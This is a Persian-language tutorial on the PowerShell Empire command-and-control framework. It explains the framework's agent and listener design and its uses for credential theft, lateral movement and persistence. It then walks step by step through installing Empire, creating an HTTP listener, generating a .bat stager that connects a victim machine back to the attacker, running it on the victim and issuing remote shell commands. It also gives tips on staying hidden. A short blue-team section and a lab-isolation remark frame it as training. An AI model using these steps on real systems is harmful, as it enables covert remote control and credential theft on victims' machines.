
---

## **PowerShell Empire چیست؟**

**PowerShell Empire** (یا به اختصار **Empire**) یک **C2 Framework متن‌باز** برای **Post-Exploitation** هست که توسط **Will Schroeder (harmj0y)** و تیمش ساخته شد.

به زبان ساده:

> **ابزاری برای Red Team و مهاجم‌ها** که بهشون اجازه می‌ده **سیستم‌های آلوده رو مدیریت کنن، دستورات رو اجرا کنن، اطلاعات جمع کنن و ماندگاری (Persistence) بسازن** – همه با استفاده از PowerShell و بعداً Python.

---

## **ویژگی‌های اصلی:**

1. **استفاده از PowerShell** → بدون نیاز به اجرای فایل‌های بزرگ و قابل‌مشاهده (Living-off-the-Land).
    
2. **Agent-Server Architecture** → سیستم قربانی (Agent) به سرور Empire (C2) وصل می‌شه و دستور می‌گیره.
    
3. **ماژول‌های آماده‌ی زیاد** → برای سرقت Credential، حرکت جانبی (Lateral Movement)، جمع‌آوری اطلاعات و …
    
4. **پشتیبانی از چند زبان** → نسخه‌های جدیدتر علاوه بر PowerShell از Python هم پشتیبانی می‌کنن.
    
5. **بای‌پس آنتی‌ویروس و دفاع‌ها** → طراحی شده که **در مقابل AV و EDR شناسایی سختی داشته باشه** (به‌خصوص نسخه‌های اولیه).
    

---

## **ساختار Empire**

Empire دو بخش اصلی داره:

- **Listener (شنونده):** مثل یک درگاه ارتباطی که Agentها بهش وصل می‌شن. (مثلاً روی HTTP یا HTTPS)
    
- **Agent (عامل):** کدی که روی سیستم قربانی اجرا می‌شه و با Listener حرف می‌زنه.
    

---

## **کاربردهای رایج Empire**

- **اجرای دستورات از راه دور** روی سیستم آلوده
    
- **سرقت Credentialها** (رمز عبور، هش‌ها، توکن‌ها)
    
- **حرکت جانبی (Lateral Movement)** به سیستم‌های دیگه در شبکه
    
- **Persistence** (ماندگاری بعد از ریبوت)
    
- **جمع‌آوری اطلاعات سیستم و شبکه**
    

---

## **چرا مهمه برای Blue Team؟**

چون Empire یکی از **ابزارهای محبوب مهاجم‌ها** و **Red Teamها**ست، تیم‌های دفاعی باید:

- **الگوهای ترافیکی (HTTP/S، named pipes)** رو بشناسن
    
- **رفتار PowerShell مشکوک** رو در لاگ‌ها شناسایی کنن
    
- **ماژول‌های Empire** رو بدونن برای ایجاد Rule و Detection
    

---

### **نکته:**

توسعه رسمی Empire یک مدت متوقف شد، اما **در 2019 توسط BC-Security ادامه پیدا کرد** و حالا به‌عنوان **Empire 4.x** با Python و قابلیت‌های جدید فعال هست.

---
---

## **۱. نصب PowerShell Empire**

### پیش‌نیازها:

- Python 3.8+
    
- Git
    
- Systemd (برای اجرا به شکل سرویس اختیاریه)
    

### دستورات نصب:

```bash
sudo apt update && sudo apt install git python3 python3-pip -y
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh
```

بعد از نصب:

```bash
./empire
```

با این دستور وارد کنسول Empire می‌شی. (یک محیط شبیه Metasploit)

---

## **۲. ساخت Listener**

**Listener** همون سرور ارتباطی هست که Agent (سیستم قربانی) بهش وصل می‌شه.  
در Empire:

```bash
listeners
uselistener http
set Name myListener
set Host http://YOUR_IP:8080
execute
```

- **Host:** آی‌پی سرور خودت (جایی که Empire روش ران شده).
    
- **Port:** به‌صورت پیش‌فرض 8080 هست، ولی می‌تونی عوضش کنی.
    

حالا با دستور:

```bash
listeners
```

می‌تونی ببینی Listener فعالت ساخته شده.

---

## **۳. ساخت Agent (Payload)**

حالا باید **کدی بسازیم که روی سیستم قربانی اجرا بشه و به Listener وصل بشه.**

```bash
uselistener http
usestager windows/launcher_bat
set Listener myListener
set OutFile /tmp/agent.bat
execute
```

این یک فایل `.bat` می‌سازه که وقتی روی ویندوز اجرا بشه، **Agent** رو راه می‌اندازه و به Listener وصل می‌شه.  
(می‌تونی از **stagerهای دیگه** مثل PowerShell، EXE، DLL هم استفاده کنی.)

---

## **۴. اجرای Agent روی قربانی**

- فایل ساخته‌شده (مثلاً `agent.bat`) رو به سیستم ویندوزی انتقال بده و اجراش کن.
    
- بعد از اجرا، اگر همه‌چی درست باشه، توی Empire یک Session جدید می‌بینی:
    

```bash
agents
```

اینجا لیست Agentهای متصل رو نشون می‌ده.

---

## **۵. تعامل با Agent**

برای ورود به Agent:

```bash
interact AGENT_NAME
```

حالا می‌تونی دستورهایی مثل این بزنی:

```bash
shell whoami
shell ipconfig
```

---

### نکته‌ها:

- اگر می‌خوای **مخفی‌تر باشه**، می‌تونی به جای HTTP از HTTPS یا حتی Named Pipe استفاده کنی.
    
- اگر برای تمرین توی لبت داری انجام می‌دی، **سیستم قربانی رو ایزوله کن (شبکه داخلی فقط).**
    

---
